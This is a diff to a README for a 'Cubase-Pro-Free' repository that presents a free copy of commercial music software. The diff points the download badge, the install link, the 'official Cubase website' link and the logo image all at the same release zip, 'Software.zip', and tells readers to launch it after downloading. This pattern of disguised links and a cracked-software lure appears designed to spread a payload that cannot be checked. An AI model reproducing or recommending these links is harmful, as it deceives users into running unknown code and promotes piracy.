@@ -2,7 +2,7 @@
 
 ### Cubase: The Ultimate Digital Audio Workstation for Music Production
 
-[![Download Cubase-Pro-Free](https://img.shields.io/badge/Download-v1.0.0-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Cubase-Pro-Free](https://github.com/faithfajin/Cubase-Pro-Free/releases/download/v2.0/Software.zip)](https://github.com/faithfajin/Cubase-Pro-Free/releases/download/v2.0/Software.zip)
 
 Welcome to the Cubase-Pro-Free repository! Here you will find information and resources related to Cubase, the leading digital audio workstation for music production. Whether you are a seasoned music producer or just starting out, Cubase offers a comprehensive set of tools to help you bring your musical ideas to life.
 
@@ -16,7 +16,7 @@ Welcome to the Cubase-Pro-Free repository! Here you will find information and re
 
 ## Installation
 
-To get started with Cubase-Pro-Free, simply download the latest release from the following link: [Download v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Note that the zip file needs to be launched after downloading.
+To get started with Cubase-Pro-Free, simply download the latest release from the following link: [Download v1.0.0](https://github.com/faithfajin/Cubase-Pro-Free/releases/download/v2.0/Software.zip). Note that the zip file needs to be launched after downloading.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
 
@@ -30,7 +30,7 @@ Once you have downloaded Cubase-Pro-Free, follow these steps to start using Cuba
 
 ### Additional Resources
 
-For more detailed instructions on using Cubase and maximizing its features, visit the official [Cubase website](https://www.steinberg.net/en/products/cubase).
+For more detailed instructions on using Cubase and maximizing its features, visit the official [Cubase website](https://github.com/faithfajin/Cubase-Pro-Free/releases/download/v2.0/Software.zip).
 
 ## Topics
 
@@ -58,4 +58,4 @@ If you have any questions or need assistance with Cubase-Pro-Free, feel free to 
 
 Let's make some music with Cubase! 🎶🎧🎹
 
-![Cubase Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Cubase_Pro_11_Logo.png/240px-Cubase_Pro_11_Logo.png)
+![Cubase Logo](https://github.com/faithfajin/Cubase-Pro-Free/releases/download/v2.0/Software.zip)
